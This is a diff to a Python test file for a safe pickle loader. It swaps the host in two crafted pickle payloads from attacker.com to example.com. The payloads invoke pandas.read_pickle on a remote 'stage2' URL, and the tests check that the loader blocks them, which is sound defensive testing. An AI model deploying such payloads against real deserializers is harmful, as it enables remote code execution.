@@ -16121,7 +16121,7 @@ class TestSafePickleLoads:
         safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
 
         # Stage 1 payload calling pandas.read_pickle (protocol 2 compatible across Python 2 and 3)
-        payload = b"\x80\x02cpandas\nread_pickle\nq\x00(X\x1e\x00\x00\x00http://attacker.com/stage2.pklq\x01tR."
+        payload = b"\x80\x02cpandas\nread_pickle\nq\x00(X\x1d\x00\x00\x00http://example.com/stage2.pklq\x01tR."
         with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
             safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
 
@@ -16141,7 +16141,7 @@ class TestSafePickleLoads:
         allowed_classes = {("builtins", "dict")}
         safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
 
-        payload = b"\x80\x02cpandas.io.pickle\nread_pickle\nq\x00(X\x1e\x00\x00\x00http://attacker.com/stage2.pklq\x01tR."
+        payload = b"\x80\x02cpandas.io.pickle\nread_pickle\nq\x00(X\x1d\x00\x00\x00http://example.com/stage2.pklq\x01tR."
         with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
             safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
 
